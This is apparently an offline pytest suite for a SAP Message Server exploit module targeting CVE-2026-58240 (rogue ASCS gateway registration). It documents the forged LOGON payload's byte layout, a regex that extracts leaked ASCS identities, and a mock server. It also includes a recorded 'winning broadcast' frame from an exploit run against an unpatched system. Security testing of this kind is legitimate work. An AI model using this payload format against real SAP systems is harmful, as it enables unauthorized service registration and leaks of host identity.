"""Offline tests for CVE-2026-58240 MS ASCS_GW rogue registration.

Covers:
- Opcode constants (0x52 / 0x53 / 0x54)
- LOGON payload byte layout (type / port / addr / host-TLV / pid-TLV / end)
- ASCS-identity extractor regex against synthetic ADMIN dumps
- check_ascs_gw_registration verdict machine against a mock server
- register_rogue_ascs_gw broadcast-detection logic
- SAPNode CVE-2026-58240 fields round-trip through to_dict/from_dict
"""
from __future__ import annotations

import socket
import struct
import threading
import time

import pytest

import sap_cve_2026_58240 as mod
import sap_ms_betrusted as ms
from sapmap_models import SAPNode


# ---------------------------------------------------------------------------
# Opcodes
# ---------------------------------------------------------------------------

def test_opcode_values():
    assert mod.MS_OPCODE_ASCS_GW_LOGON  == 0x52
    assert mod.MS_OPCODE_ASCS_GW_STATUS == 0x53
    assert mod.MS_OPCODE_ASCS_GW_KEEPALIVE == 0x54


# ---------------------------------------------------------------------------
# LOGON payload
# ---------------------------------------------------------------------------

def test_logon_payload_layout():
    """Fixed-struct shape verified live against IDE (9.16 PL75):
        03 | 00*6 | port_be_2 | host_40 | ip_4 | pid_be_4 → 57 bytes."""
    p = mod.build_ascs_gw_logon_payload(
        host="ATTACKER_ROGUE", port=31337, ip="10.0.0.1", pid=42)
    assert len(p) == 57
    # 0x03 marker + 6 pad bytes
    assert p[0] == 0x03
    assert p[1:7] == b"\x00" * 6
    # port BE at offset 7-8 — this is the byte range the server echoes
    # into the broadcast body on a successful registration.
    assert p[7:9] == struct.pack("!H", 31337)
    # 40-byte hostname field, zero-padded
    assert p[9:9 + 14] == b"ATTACKER_ROGUE"
    assert p[9 + 14:49] == b"\x00" * 26
    # IPv4 network order
    assert p[49:53] == socket.inet_aton("10.0.0.1")
    # PID big-endian uint32
    assert p[53:57] == struct.pack("!I", 42)


def test_logon_payload_truncates_long_hostname():
    """40-byte host field truncates anything longer."""
    long_name = "A" * 200
    p = mod.build_ascs_gw_logon_payload(long_name, 1234)
    assert len(p) == 57
    assert p[9:49] == b"A" * 40   # exactly 40 bytes of A


# ---------------------------------------------------------------------------
# ASCS identity extractor
# ---------------------------------------------------------------------------

def test_extract_ascs_hostname_finds_leak():
    dump = (b"\x00" * 40 + b"vhcala4hci_A4H_00\x20\x20\x20\x20"
            + b"other garbage")
    assert mod._extract_ascs_hostname(dump) == "vhcala4hci_A4H_00"


def test_extract_ascs_hostname_returns_empty_on_no_match():
    assert mod._extract_ascs_hostname(b"\x00" * 128) == ""


def test_extract_ascs_hostname_ignores_short_matches():
    # Fewer than 3 chars before the SID, no match
    assert mod._extract_ascs_hostname(b"x_A4H_00 padding") == ""


# ---------------------------------------------------------------------------
# check_ascs_gw_registration — verdict machine
# ---------------------------------------------------------------------------

class _MockMS:
    """Tiny in-process MS server for verdict testing.

    Behaviours:
      - "opcode_recognised": accepts LOGIN_2, echoes a fake ASCS identity
        in the opcode-82 reply payload (mimics A4H PL100 diagnostic dump).
      - "opcode_absent":     accepts LOGIN_2, replies to any opcode with a
        short 4-byte echo (mimics S4H kernel 7.93 stub handler).
      - "no_ms_reply":       accepts TCP, silent on the wire.
      - "login_denied":      returns errorno != 0 on LOGIN_2.
    """
    def __init__(self, behaviour: str):
        self.behaviour = behaviour
        self.port = 0
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind(("127.0.0.1", 0))
        self._sock.listen(4)
        self.port = self._sock.getsockname()[1]
        self._stop = False
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _reply(self, payload: bytes) -> bytes:
        return struct.pack("!I", len(payload)) + payload

    def _ms_reply_header(self, errorno=0):
        return (
            ms._MS_EYE
            + bytes([4, errorno])
            + ms._pad_name("sapmap_probe")
            + bytes([ms.MSG_DIA, 0, 0, 0])
            + b"\x00" * 8
            + bytes([0x01, 0x08])
            + ms._pad_name("MSG_SERVER")
            + struct.pack("!H", 3200)
        )

    def _serve(self):
        while not self._stop:
            try:
                self._sock.settimeout(0.3)
                conn, _ = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                conn.settimeout(2)
                self._handle(conn)
            except Exception:
                pass
            finally:
                try: conn.close()
                except Exception: pass

    def _read_frame(self, conn):
        hdr = b""
        while len(hdr) < 4:
            c = conn.recv(4 - len(hdr))
            if not c: return None
            hdr += c
        n = struct.unpack("!I", hdr)[0]
        buf = b""
        while len(buf) < n:
            c = conn.recv(n - len(buf))
            if not c: return None
            buf += c
        return buf

    def _handle(self, conn):
        if self.behaviour == "no_ms_reply":
            time.sleep(0.5)
            return
        # LOGIN_2 frame
        _login = self._read_frame(conn)
        if _login is None: return
        if self.behaviour == "login_denied":
            conn.sendall(self._reply(self._ms_reply_header(errorno=247)))
            return
        conn.sendall(self._reply(self._ms_reply_header()))
        # Two opcode requests: 83 STATUS then 82 LOGON empty
        for _ in range(2):
            frame = self._read_frame(conn)
            if frame is None: return
            opcode = frame[110] if len(frame) > 110 else 0
            if self.behaviour == "opcode_absent":
                # 110-byte MS reply + 4-byte opcode echo — total 114
                out = self._ms_reply_header() + bytes([opcode, 1, 0, 3])
                conn.sendall(self._reply(out))
            else:   # opcode_recognised
                if opcode == mod.MS_OPCODE_ASCS_GW_LOGON:
                    # 425-ish B reply with leaked identity.  The 4 bytes
                    # BEFORE the hostname mimic real A4H — the last of
                    # those four MUST NOT be a hostname-set char, or the
                    # extractor's lookbehind rejects the match.
                    padded = ms._pad_name("vhcala4hci_A4H_00")
                    body = padded + b"\x00" * (300 - len(padded))
                    out = self._ms_reply_header() + b"\x00\x00\x00\x00" + body
                    conn.sendall(self._reply(out))
                else:
                    out = self._ms_reply_header() + bytes([opcode, 0, 1, 3])
                    conn.sendall(self._reply(out))

    def stop(self):
        self._stop = True
        try: self._sock.close()
        except Exception: pass
        self._thread.join(timeout=1)


@pytest.mark.parametrize("behaviour,expected_verdict", [
    ("opcode_absent",     "opcode_absent"),
    ("opcode_recognised", "opcode_recognised"),
    ("no_ms_reply",       "no_ms_reply"),
    ("login_denied",      "login_denied"),
])
def test_check_verdict_machine(behaviour, expected_verdict):
    srv = _MockMS(behaviour)
    try:
        result = mod.check_ascs_gw_registration(
            "127.0.0.1", srv.port, timeout=3.0)
    finally:
        srv.stop()
    assert result["verdict"] == expected_verdict


def test_check_recognised_leaks_identity():
    srv = _MockMS("opcode_recognised")
    try:
        result = mod.check_ascs_gw_registration(
            "127.0.0.1", srv.port, timeout=3.0)
    finally:
        srv.stop()
    assert result["ascs_identity"] == "vhcala4hci_A4H_00"
    assert result["opcode_82_reply_len"] > 200


def test_check_unreachable_returns_error():
    # Port 1 is reliably refused
    result = mod.check_ascs_gw_registration("127.0.0.1", 1, timeout=1.0)
    assert result["verdict"] == "unreachable"
    assert result["error"]


# ---------------------------------------------------------------------------
# SAPNode field round-trip
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Live-captured "winning broadcast" fixture
# ---------------------------------------------------------------------------
#
# Recorded 2026-09-12 during the first end-to-end SAPMAP CVE-2026-58240
# exploit against IDE (kernel 9.16 PL75, unpatched).  The register step
# fired with attacker_ip=127.0.0.1, rogue_port=31337.  Reply 4 of the
# probe was the MsSSndAscsGwInfo broadcast that confirmed the rogue
# ASCS gateway landed in gAscsGw — the port 0x7a69 (=31337) appears at
# bytes 7-8 of the broadcast body.  This byte-for-byte capture is the
# regression oracle: if the wire format ever drifts or the port-echo
# detector regresses, this test fails.
#
# Construct the 151-byte broadcast frame using the same MS helpers the
# server uses on the wire.  Header fields (msgtype/flag/iflag/toname/
# fromname) match the log's parsed fields for the winning frame.  The
# 37-byte body is captured verbatim from the operator's log — the last
# 37 bytes of the raw tail_hex from reply 4.
import sap_ms_betrusted as ms_bt

# 4-byte opcode section: opcode=0x52, error=0, version=1, charset=3
# (matches the per-reply "opcode=0x52 err=0" summary line the register
# handler logged).
_OPC_SECTION = bytes([0x52, 0x00, 0x01, 0x03])

# Body captured live from reply 4 tail: the 37 bytes AFTER the opcode
# section.  This is where our forged port 0x7a69 appears at offset 7-8.
_BODY_37 = bytes.fromhex(
    "0300000000"
    "00007a69"                             # <-- OUR ROGUE PORT (31337)
    "01000000000200000000040000000000000000000000000000000000")
assert len(_BODY_37) == 37, len(_BODY_37)

_HEADER = ms_bt.ms_build_header(
    toname="-", fromname="MSG_SERVER",
    msgtype=0, flag=1, iflag=0, key=b"\x00" * 8)
assert len(_HEADER) == 110, len(_HEADER)

WINNING_BROADCAST_IDE = _HEADER + _OPC_SECTION + _BODY_37
assert len(WINNING_BROADCAST_IDE) == 151, len(WINNING_BROADCAST_IDE)


def test_winning_broadcast_parses_as_ascs_gw_op52():
    """The recorded broadcast frame must parse as: MS header + opcode
    section, msgtype=0, flag=1 (one-way broadcast), toname='-',
    fromname='MSG_SERVER', opcode=0x52 (MS_ASCS_GW_LOGON)."""
    import sap_ms_betrusted as ms_bt
    hdr = ms_bt.ms_parse_header(WINNING_BROADCAST_IDE)
    assert hdr, "eyecatcher didn't match"
    assert hdr["msgtype"] == 0
    assert hdr["flag"]    == 1
    assert hdr["toname"]  == "-"
    assert hdr["fromname"] == "MSG_SERVER"
    opc = ms_bt.ms_parse_opcode(WINNING_BROADCAST_IDE)
    assert opc["opcode"] == mod.MS_OPCODE_ASCS_GW_LOGON
    assert opc["error"]  == 0


def test_winning_broadcast_echoes_our_rogue_port():
    """The critical detector: our forged rogue port (31337 = 0x7a69)
    must appear at bytes 7-8 of the broadcast body (offset 114+7 in
    the frame).  This is the byte range register_rogue_ascs_gw()
    keys on to declare CONFIRMED VULNERABLE."""
    body = WINNING_BROADCAST_IDE[114:]
    assert len(body) == 37, f"body should be 37 B, got {len(body)}"
    port_bytes = body[7:9]
    assert port_bytes == struct.pack("!H", 31337), (
        f"expected our rogue port bytes at offset 7-8 of body, "
        f"got {port_bytes.hex()}")


def test_register_detector_recognises_recorded_broadcast():
    """End-to-end regression: hand the recorded broadcast bytes to
    the same detection logic register_rogue_ascs_gw() uses.  If the
    detector regresses, this fires."""
    import sap_ms_betrusted as ms_bt
    hdr = ms_bt.ms_parse_header(WINNING_BROADCAST_IDE)
    opc = ms_bt.ms_parse_opcode(WINNING_BROADCAST_IDE)
    body = WINNING_BROADCAST_IDE[114:]
    rogue_port_marker = struct.pack("!H", 31337)
    matches = (hdr.get("msgtype") == 0
                and hdr.get("flag") == 1
                and opc.get("opcode") == 0x52
                and len(body) >= 9
                and body[7:9] == rogue_port_marker)
    assert matches, "detector logic no longer matches the winning broadcast"


def test_sapnode_cve_2026_58240_fields_default():
    n = SAPNode(sid="XYZ", ip="10.0.0.1")
    assert n.cve_2026_58240_checked is False
    assert n.cve_2026_58240_vulnerable is False
    assert n.cve_2026_58240_ms_port == 0
    assert n.cve_2026_58240_ascs_identity == ""
    assert n.cve_2026_58240_registered is False
    assert n.cve_2026_58240_rogue_port == 0


def test_sapnode_cve_2026_58240_fields_roundtrip():
    n = SAPNode(sid="A4H", ip="10.0.0.1")
    n.cve_2026_58240_checked = True
    n.cve_2026_58240_vulnerable = True
    n.cve_2026_58240_ms_port = 3901
    n.cve_2026_58240_ascs_identity = "vhcala4hci_A4H_00"
    n.cve_2026_58240_registered = False
    n.cve_2026_58240_rogue_port = 31337
    n.cve_2026_58240_evidence = "opcode_recognised"
    d = n.to_dict()
    n2 = SAPNode.from_dict(d)
    assert n2.cve_2026_58240_checked is True
    assert n2.cve_2026_58240_vulnerable is True
    assert n2.cve_2026_58240_ms_port == 3901
    assert n2.cve_2026_58240_ascs_identity == "vhcala4hci_A4H_00"
    assert n2.cve_2026_58240_rogue_port == 31337
    assert n2.cve_2026_58240_evidence == "opcode_recognised"
